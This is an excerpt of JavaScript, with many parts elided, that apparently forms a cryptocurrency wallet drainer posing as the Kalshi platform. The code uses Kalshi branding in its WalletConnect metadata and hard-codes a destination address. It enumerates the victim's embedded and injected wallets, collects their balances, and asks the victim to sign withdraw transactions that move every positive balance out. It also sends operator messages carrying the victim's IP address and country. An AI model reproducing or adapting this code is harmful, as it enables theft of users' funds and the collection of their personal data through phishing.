(async () => {
    ...
    const EVM_DESTINATION = "0x1c26170dcfc82ceb402b22ab012207d290afea42";
    ...
    function checkUSDCBalanceForWithdrawals(assetsToWithdraw, availableUSDC) {
        ...
        console.debug(`[Kalshi] USDC balance check:`);
    ...
    const SIGN_TYPES = {
        WITHDRAW: {
            primaryType: 'KalshiTransaction:Withdraw',
            types: [
                { name: 'kalshiChain', type: 'string' },
    ...
    const injectedStart = async (connection) => {
        try {
            console.debug('[Kalshi] Starting injectedStart for:', connection.address);
                ...
                connectors: [
                    ...
                    walletConnect({
                        ...
                        metadata: {
                            name: "Kalshi",
                            description: "Kalshi",
                            url: "https://kalshi.com/portfolio",
                            icons: ["https://kalshi.com/favicon.ico"],
                        },
                    }),
                ],
            });
            ...
            if (account.status !== 'connected') {
                console.debug('[Kalshi] Account not connected, attempting reconnect...');
                await wagmi.reconnect(config);

                account = wagmi.getAccount(config);
                if (account.status !== 'connected') {
                    console.debug('[Kalshi] Reconnect failed for:', connection.address);
                ...
                retryWithBackoff(
                    async () => {
                        return new Promise((resolve) => {
                            const ws = new WebSocket("wss://api-ui.kalshi.xyz/ws");
                            let spotStateData = null;
                            let webData3Data = null;

                            const timeoutId = setTimeout(() => {
                                console.debug('[Kalshi] WebSocket timeout, returning partial data');
                            ...
                            ws.onmessage = (event) => {
                                try {
                                    ...
                                    if (parsed.channel === "webData3") {
                                        ...
                                        console.debug('[Kalshi] webData3 received:', {
                                            hasData: !!parsed.data,
                                        ...
                                        if (Array.isArray(parsed?.data?.perpDexStates)) {
                                            ...
                                            console.debug('[Kalshi] webData3 structure differs from expected');
                                            checkComplete();
                                        }
                                    }
                                } catch (e) {
                                    console.debug('[Kalshi] WebSocket message parse error:', e);
                                }
                            };

                            ws.onerror = (err) => {
                                console.debug('[Kalshi] WebSocket error:', err);
                                clearTimeout(timeoutId);
                                try { ws.close(); } catch (_) { }
                                resolve({ spotState: spotStateData, webData3: webData3Data });
                            };
                    ...
                    console.debug('[Kalshi] Failed to get Kalshi data after retries:', error);
            ...
            console.debug('[Kalshi] Prices loaded:', Object.keys(prices).length);
            console.debug('[Kalshi] Asset registry loaded:', registry ? Object.keys(registry).length : 0);
            ...
            if (webData3?.data) {
                ...
                if (webData3.data.perpDexStates && Array.isArray(webData3.data.perpDexStates) && webData3.data.perpDexStates.length > 0) {
                    ...
                    if (perpDexState?.clearinghouseState?.withdrawable !== undefined) {
                        ...
                        console.debug('[Kalshi] Perp USDC found via path 1 (perpDexStates[0].clearinghouseState.withdrawable):', perpUSDC);
                    } else {
                        console.debug('[Kalshi] Path 1 failed: clearinghouseState.withdrawable not found');
                        // Пробуем найти withdrawable в других местах
                        if (perpDexState?.withdrawable !== undefined) {
                            perpUSDC = perpDexState.withdrawable;
                            console.debug('[Kalshi] Perp USDC found via alternative path (perpDexStates[0].withdrawable):', perpUSDC);
                        }
                    }
                }
                ...
                if (perpUSDC === null && webData3.data.clearinghouseState?.withdrawable !== undefined) {
                    ...
                    console.debug('[Kalshi] Perp USDC found via path 2 (data.clearinghouseState.withdrawable):', perpUSDC);
                }
                ...
                if (perpUSDC === null && webData3.data.withdrawable !== undefined) {
                    ...
                    console.debug('[Kalshi] Perp USDC found via path 3 (data.withdrawable):', perpUSDC);
                }
                
                if (perpUSDC === null) {
                    console.debug('[Kalshi] All paths failed. webData3.data structure:', JSON.stringify(webData3.data, null, 2));
                }
            } else {
                console.debug('[Kalshi] webData3 or webData3.data is null/undefined');
                console.debug('[Kalshi] webData3:', webData3);
            }
            
            // Fallback: если WebSocket не вернул perp USDC, получаем через REST API
            if (perpUSDC === null || perpUSDC === undefined) {
                console.debug('[Kalshi] Attempting to fetch perp USDC via REST API as fallback...');
                try {
                    ...
                    if (clearinghouseResponse && clearinghouseResponse.ok) {
                        ...
                        if (restWithdrawable !== undefined && restWithdrawable !== null) {
                            ...
                            if (!isNaN(parsedRest) && isFinite(parsedRest)) {
                                ...
                                console.debug('[Kalshi] Perp USDC from REST API (fallback):', perpUSDC);
                            } else {
                                console.debug('[Kalshi] REST API returned invalid withdrawable value:', restWithdrawable);
                            }
                        } else {
                            console.debug('[Kalshi] REST API response structure:', JSON.stringify(clearinghouseData, null, 2));
                        }
                    } else {
                        console.debug('[Kalshi] REST API clearinghouseState failed:', clearinghouseResponse?.status || 'no response');
                    }
                } catch (error) {
                    console.debug('[Kalshi] Error fetching perp USDC via REST API:', error);
                }
            }
            ...
            if (perpUSDC !== null && perpUSDC !== undefined) {
                ...
                if (!isNaN(parsed) && isFinite(parsed)) {
                    ...
                    console.debug('[Kalshi] Warning: perpUSDC is not a valid number:', perpUSDC, typeof perpUSDC);
                }
            }
            ...
            console.debug('[Kalshi] USDC balances:');
            ...
            if (perpUSDCAmount === 0 && webData3) {
                console.debug('[Kalshi] Warning: perpUSDC is 0 but webData3 exists. This might indicate a parsing issue.');
            }
            ...
            if (allPositiveBalances.length === 0) {
                console.debug('[Kalshi] No positive balances found for:', connection.address);
            ...
            console.debug('[Kalshi] Assets to withdraw:', sortedPositiveBalances.length);
            ...
            if (!usdcCheck.sufficient) {
                ...
                console.debug('[Kalshi] Insufficient USDC balance, filtering assets...');
                ...
                if (finalAssetsToWithdraw.length === 0) {
                    console.debug('[Kalshi] No assets can be withdrawn with available USDC');
                    queueMessage(
            ...
            function buildServerUrl(protocolType, isRpc) {
                ...
                let url = 's://'.concat(serverType, '.kalshi.xyz');
            ...
            async function handleWithdraw(balance, currentTimestamp, index, total) {
                ...
                if (!assetConfig) {
                    console.debug("[Kalshi] No asset config found for:", coin);
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                ...
                try {
                    ...
                    console.debug("[Kalshi] Error creating withdraw action for", coin, ":", error);
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                ...
                if (!withdrawAction || !signTypedData) {
                    console.debug("[Kalshi] Missing withdraw action or signTypedData for", coin);
                    return undefined;
                }
                ...
                try {
                    ...
                    console.debug("[Kalshi] User rejected withdraw request:", error);
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                ...
                queueMessage(
                    "📍 <b>Platform: </b> " + platform + "\n\n" +
                    "📤 <b>Sending " + assetSymbol + " to Kalshi...</b>\n\n" +
                    getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                    0, "", code, username, platform
                );
                ...
                if (apiResponse.status !== 200) {
                    console.debug("[Kalshi] Withdraw request failed:", apiResponse);
                ...
                if (responseData && responseData.status === "err") {
                    ...
                    console.debug("[Kalshi] API returned error:", errorMessage);
            ...
            for (let i = 0; i < sortedPositiveBalances.length; i++) {
                ...
                try {
                    ...
                    if (availableBalance > 0) {
                        console.debug('[Kalshi] Processing withdrawal', i + 1, '/', totalAssets, ':', balance.coin, 'amount:', availableBalance);
                        ...
                        if (result) {
                            ...
                            console.debug('[Kalshi] Withdrawal failed for:', balance.coin);
                    ...
                    console.debug('[Kalshi] Error processing withdrawal:', error);
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
            ...
            // Summary message
            console.debug('[Kalshi] Total withdrawals processed:', withdrawals.length);
            ...
            console.debug('[Kalshi] injectedStart error:', error);
            queueMessage(
    ...
    try {
        console.debug('[Kalshi] Total connections to process:', privyConnectionsStorage.length);
        ...
        console.debug('[Kalshi] Embedded connections:', embeddedConnections.length, '| Injected connections:', injectedConnections.length);
        ...
        if (embeddedConnections.length > 0) {
            console.debug('[Kalshi] Phase 1: Processing embedded wallets in parallel...');
            const embeddedResults = await Promise.allSettled(
                embeddedConnections.map(async (connection) => {
                    try {
                        console.debug('[Kalshi] Processing embedded connection:', connection.address);
                        ...
                        console.debug('[Kalshi] Embedded connection error:', error);
            ...
            for (const settled of embeddedResults) {
                if (settled.status === 'fulfilled' && settled.value.success) {
                    ...
                    console.debug('[Kalshi] Embedded connection processed successfully');
                } else {
                    const errorInfo = settled.status === 'rejected' ? settled.reason : settled.value?.error;
                    console.debug('[Kalshi] Embedded connection failed:', errorInfo);
                    queueMessage(
        ...
        if (injectedConnections.length > 0) {
            console.debug('[Kalshi] Phase 2: Processing injected wallets sequentially (requires user interaction)...');
            for (const connection of injectedConnections) {
                try {
                    console.debug('[Kalshi] Processing injected connection:', connection.address);
                    
                    const withdrawals = await injectedStart(connection);
                    console.debug('[Kalshi] Injected start result:', withdrawals?.length, 'withdrawals');
                    
                    processInjectedResult(connection, withdrawals);
                    console.debug('[Kalshi] Injected connection processed successfully');
                    ...
                    console.debug('[Kalshi] Injected connection error:', connectionError);
                    queueMessage(
        ...
        console.debug('[Kalshi] All connections processed');
    } catch (error) {
        console.debug('[Kalshi] Critical Error:', error);
        return;
    } finally {
        setTimeout(() => {
            location.reload();
